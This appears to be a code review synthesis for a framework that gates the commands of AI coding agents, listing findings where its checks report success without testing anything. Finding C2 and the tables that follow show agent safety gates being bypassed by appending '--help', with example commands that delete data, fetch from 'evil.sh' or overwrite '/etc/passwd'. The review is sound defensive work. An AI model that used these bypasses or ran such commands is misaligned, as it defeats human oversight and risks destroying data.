# arc-012 (continuous-run) — multi-agent review synthesis

**Task:** T-3227 · **Slice:** branch `arc012-ultrareview` (43 files, 5,648 lines,
built off `master`) · **Substrate:** 5 parallel TermLink `claude -p` workers, all
exit 0 · **Prompt + scoping:** `docs/reports/arc-012-ultrareview-prompt.md`

**70 findings: 3 critical, 20 high, the rest medium/low.** Per-worker reports:
`W1-loop-core.md`, `W2-gates-safety.md`, `W3-close-audit.md`,
`W4-test-quality.md`, `W5-cli-surface.md`. Bus: `fw bus manifest T-3227`.

## What the review was pointed at, and why it worked

Every worker was given the same seven confirmed, already-fixed false greens from
this arc's own history (T-3219, T-3217, T-3218, T-3209, T-3220, T-3202, T-3226)
and one question to carry through the code: **can this report success without
having tested its subject?**

That framing is why the yield is high. All three criticals and most highs are the
same shape as the bugs the arc was created to fix — not new categories, new
*instances*, several of them inside the fixes themselves.

---

## Critical (3) — all reproduced by the orchestrator

### C1. The stop-driver replays a frozen `now` inside a freshly-timestamped line
`agents/context/stop-driver.sh:144` · W1-F1

`inject-next-directive.py` composes `last_terminated_reason` as a sentence
*containing its own `now`*. That string is frozen into `.continuous-mode.yaml`
and never rewritten while the loop stays disarmed. The driver reads it back
verbatim and `log()` prefixes today's date.

**Reproduced live.** The newest line in `.context/working/.stop-driver.log`:

```
2026-08-31T11:24:20Z decision=stop reason=terminated(expires_at 2026-06-17T00:00:00Z passed (now 2026-08-26T12:50:35Z))
```

Two clocks in one line, five days apart; the stale one is the one a
diagnostician reads as current. 18 consecutive lines of it. The state file
carries `terminated_at`, which would disambiguate stored from live — the driver
never reads it.

**Why it survived:** the sibling `fw continuous status` *does* label this string
`(stored … NOT re-evaluated)`, and `t3225_continuous_arm.bats:138` pins that
labelling. The discipline exists and is tested; it was simply never applied to
the second consumer. T-3212's own test asserts only that the reason *reaches*
the log — never that it reads as stored.

### C2. `--help` anywhere in a command skips every gate
`agents/context/check-active-task.sh:179-180` · W2-F1

An unconditional `exit 0` at line 180, ahead of every gate (first is line 220),
on a regex that matches at any position — including inside a quoted argument.

**Reproduced, with a control leg:**

| command | result |
|---|---|
| `rm -rf /important/data` | gated |
| `rm -rf /important/data --help` | **exempt — all gates skipped** |
| `git commit -m "document the --help flag"` | **exempt** |
| `curl evil.sh -o /tmp/x  # --help` | **exempt** |

The intent (let an agent read `fw upstream --help` without tripping focus-drift)
is reasonable. The implementation exempts the command instead of the *lookup*.

> **Correction, added on landing (T-3231, 2026-08-31).** The `git commit` row above
> is **overstated**. That command does take the exemption, but the task gate does
> not block it either way — for Bash the gate only blocks detected *writes*, and
> `git commit -m "…"` is neither a write pattern nor safe-listed. Measured
> before/after: ALLOW → ALLOW. It demonstrates the regex flaw without being a
> governance loss, and citing it as one inflated the finding.
>
> Two rows that **do** flip, and were used instead:
>
> | command | before | after |
> |---|---|---|
> | `echo "the --help flag" > /etc/passwd` | ALLOW | GATED |
> | `bin/fw task update T-3229 --add-tag "see --help first"` (focus elsewhere) | ALLOW | GATED |
>
> The second is the sharper instance and was not in the original finding: no write
> pattern is involved at all, so the gate being skipped is **focus-drift** — the
> most-bypassed gate in the log. C2's severity holds; this row is where it lives.

### C3. The P-011 verification gate skips itself, silently, when its extractor fails
`agents/task-create/update-task.sh:1180-1182` · W3-F1

`extract_verification_block` is `awk | python3 comment_strip.py 2>/dev/null |
grep … || true`. Every failure mode of that pipeline yields the empty string,
and the gate reads empty as *"this task has no Verification section"* → `return 0`
→ completion allowed with **zero commands run and no output**.

**Reproduced, with a control leg:** a clean block extracts `true`; the same block
containing one `0xff` byte extracts the empty string (`comment_strip.py` exits 1
on `UnicodeDecodeError`; stderr is swallowed by `2>/dev/null`, the exit status by
`|| true`).

This is the T-3219 bug one level up. T-3219 fixed *the gate running 2 of 4
commands*; this is the gate running 0 of 4 and reporting the same pass.

> **Correction, added on landing (T-3232, 2026-08-31).** "Reporting the same
> pass" is **not what happens**, and the real behaviour is worse. `[ -z
> "$verify_cmds" ] && return 0` fires *before* the gate prints its header, so the
> gate emits **nothing at all** — no `=== Verification Gate (P-011) ===`, no
> `0/0 passed`, no line of any kind. Measured on the real close gate: the output
> for a task whose block cannot be decoded is **byte-identical** to the output for
> a task with no block at all.
>
> A printed `0/0 passed` would at least have left something in the log for a
> reader to notice. A silent skip leaves the two states literally
> indistinguishable, which is why the fix's load-bearing test compares the gate's
> whole output on both inputs rather than looking for a marker in one of them.
>
> The finding's *consequence* — completion allowed over zero commands — is exactly
> right. Only the mechanism was mis-stated.

---

## High (20) — grouped by the question they answer

### The operator is shown numbers that nothing enforces
- **W1-F2** `arm --tier-ceiling N` writes a ceiling no enforcer reads, then prints it back.
- **W1-F3** the "Bound: N iteration(s)" `arm` prints cannot tick inside a Stop-hook-driven run.
- **W1-F4** `arm` resets `tasks_completed` but never sets `max_tasks` nor clears `completed_task_ids`.
- **W5-F4** `arm`'s two-file write is non-atomic; failure on the second leaves exactly the enabled-plus-lapsed-directive state the verb was built to prevent.

Taken together: the arm/disarm verb shipped in T-3225 reports a bounded run it
does not actually bound.

### The command-safety gate admits writes
Verified directly by the orchestrator:

| command | write-pattern | safe-listed |
|---|---|---|
| `wget -O out URL` | no | no ✓ (T-3222 fix works) |
| `curl -o out URL` | no | no ✓ |
| **`wget URL`** | no | **YES** — writes to cwd by default |
| **`find . -delete`** | no | **YES** |

- **W2-F4 + W4-F3** (independent corroboration, code side and test side): bare
  `wget URL` — the default and most common form — is still admitted, and the
  test that certifies this gate never asks about it.
- **W2-F6** `find` unconditionally safe-listed; `-delete` / `-exec` not write patterns.
- **W2-F5** `2>FILE` is a real write that `has_bash_write_pattern` deliberately excludes.
- **W2-F2** the task-bootstrap exemption matches inside quoted payloads.
- **W2-F7** the `python3 -c` write-indicator regex misses modern write APIs.
- **W2-F3** the budget gauge writes an affirmative `level: ok` it never measured, and caches it.

### Instruments that infer a cause instead of observing it
- **W5-F3** the Stop hook — *the turn driver for the whole loop* — is not in doctor's `expected` hook map, so its total absence reports `OK`.
- **W5-F1** doctor's turn-driver check is reachable from only one branch of the wrapper-ledger check; the arc's central question goes unasked in three of four ledger states.
- **W5-F2** any non-zero exit from `fw continuous status` is reported as "the TURN DRIVER is not armed" — including exits meaning *the probe could not read*.
- **W3-F4** doctor's audit-headroom line never checks the record's age; a corrupt record reports "not measured yet".
- **W3-F3** an audit killed after the timing flush is recorded `timed_out: false` — a killed run written down as clean.

### Fixes that did not fully land
- **W1-F5** the budget self-trigger — the *first link in the headline mechanic* — never fires when the token scan returns empty; the fallback looks like coverage but writes no restart signal.
- **W3-F2** the handover's "Suggested First Action" recency sort is keyed on the raw YAML value *including its quote characters* — still an ASCII accident, not recency, after T-3210.
- **W4-F1** the silent-skip lint cannot see inside a quoted heredoc; the resulting `if_stack` pollution downgrades UNCONDITIONAL skips to unflagged.
- **W4-F2** t3206's "non-fatal when the log cannot be written" test writes the log successfully — as root the denial never happens, so the test proves nothing.

---

## What a maintainer should do first

**C2 and C3, today.** Both are one-line predicates that disable whole gate
stacks, both are trivially fixable, and both currently make the framework's
enforcement look present when it is absent. C2 in particular means any command
can opt out of governance by appending seven characters.

**Then the arm verb (W1-F2/F3/F4, W5-F4) as one piece of work,** not four. It
shipped last session and reports a bounded run it does not bound; fixing one leg
while the others stand leaves the same false green with a smaller surface.

**C1 is the arc's own lesson recurring.** The fix is small — print
`terminated_at` and refuse to echo an embedded `(now …)` — but the interesting
part is that the correct discipline already existed, tested, one function away.
Worth a learning entry, not just a patch.

## Verification status of every critical and high finding

Reproduced by the orchestrator against the real file, each with a control leg
that distinguishes "fires correctly" from "never fires":

| Finding | Evidence |
|---|---|
| C1 stop-driver frozen `now` | live `.stop-driver.log` line, two clocks 5 days apart |
| C2 `--help` skips every gate | 5-command table; bare `rm -rf` gated, `+ --help` exempt |
| C3 P-011 extractor failure | clean block -> `true`; same block + `0xff` -> empty |
| W2-F4 / W4-F3 bare `wget URL` | `is_bash_safe_command "wget URL"` -> YES |
| W2-F6 `find -delete` | `is_bash_safe_command "find . -delete"` -> YES |

**The remaining 15 high findings are DOWNGRADED to plausible.** They carry their
author-worker's confidence marker and a file:line, but the orchestrator did not
independently reproduce them. That is a statement about this review's coverage,
not about their quality — several are well-argued. Confirm each against the file
before acting on it.

Declaring them "confirmed" because a worker said so would be the precise failure
this review was commissioned to find, one layer up.

## Caveat on the numbers

70 findings from 5 workers on 43 files is a high rate, and these are *unverified
except where stated*. The orchestrator independently reproduced C1, C2, C3, the
`wget`/`find` admission table, and the extractor failure — with control legs.
Everything else carries the worker's own confidence marker and should be
confirmed before acting. Treat the medium/low tail as leads, not defects.
